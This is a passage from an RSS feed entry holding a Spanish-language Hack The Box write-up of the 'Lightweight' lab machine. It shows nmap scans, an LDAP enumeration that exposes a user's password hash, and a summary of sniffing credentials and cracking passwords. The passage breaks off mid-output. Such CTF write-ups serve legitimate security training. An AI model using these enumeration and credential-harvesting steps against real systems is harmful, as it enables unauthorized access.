      
      <item>
        <title>Hack The Box - Lightweight</title>
        <link>https://sckull.github.io/posts/lightweight/</link>
        <pubDate>Thu, 09 May 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 09 May 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lightweight/</guid>
        <description>Nos topamos con un registro de IPs que nos dio acceso por SSH, con tcpdump obtuvimos credenciales que usamos en SSH.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Nos topamos con un registro de IPs que nos dio acceso por SSH, con tcpdump obtuvimos credenciales que usamos en SSH. Cambiamos al siguiente usuario tras crackear la contraseña encontrada en una conexion de LDAP. Realizamos la lectura de la flag root utilizando openssl.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/166&#34;&gt;Lightweight&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;os_type&#34;&gt; Linux &lt;img src=&#34;https://sckull.github.io/images/icons/linux.png&#34; class=&#34;img_type_os&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.119&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13340&#34;&gt;0xEA31&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/13340&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.3, 6.1, 4.5, 5.5, 3.9],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;En el resultado del escaneo de puertos tcp con nmap nos muestra tres puertos abiertos ssh, http y ldap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:20:40 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -o tcp 10.10.10.119
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.119
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2018-06-09T13:32:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2019-06-09T13:32:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:21:22 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 41.92 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap-script-ldapsearch&#34;&gt;NMAP SCRIPT: LDAPSEARCH&lt;/h2&gt;
&lt;p&gt;Utilizamos el script de nmap ldapsearch para poder obtener informacion en el puerto de ldap abierto, obtenemos informacion relacionada con usuarios, correo electronico, contraseña, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:40:00 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -p389 --script&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldap-search -o ldap-nmap 10.10.10.119
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.119
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE VERSION
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ldap-search: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Context: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: dcObject
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organization
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         o: lightweight htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         dc: lightweight
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Manager,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalRole
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: Manager
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         description: Directory Manager
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalUnit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ou: People
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalUnit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ou: Group
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser1,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uid: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         sn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         mail: ldapuser1@lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: person
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: inetOrgPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: shadowAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$6$3&lt;/span&gt;qx0SD9x&lt;span class=&#34;nv&#34;&gt;$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj&lt;/span&gt;.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
